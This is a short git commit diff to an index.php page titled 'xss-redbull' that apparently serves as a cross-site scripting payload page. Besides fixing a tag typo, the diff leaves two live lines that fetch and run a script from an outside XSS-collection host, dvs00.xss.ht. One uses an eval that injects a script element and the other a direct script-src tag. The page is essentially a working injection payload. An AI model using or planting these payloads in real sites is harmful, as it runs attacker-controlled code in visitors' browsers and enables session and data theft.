208eee5771f547755e5bd1228a05a7eec850145f
DVS <51111128+divyesh-01@users.noreply.github.com>
2021-02-19 13:05:51 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,13 +1,10 @@
 <html>
-<haed>
+<head>
 <title>xss-redbull</title>
 </head>
 <body>
-<script>
 javascript:eval('var a=document.createElement(\'script\');a.src=\'https://dvs00.xss.ht\';document.body.appendChild(a)')
-</script>
-<script>
 <script src=https://dvs00.xss.ht></script>
-</script>
+  <p>Done</p>
 </body>
 </html>
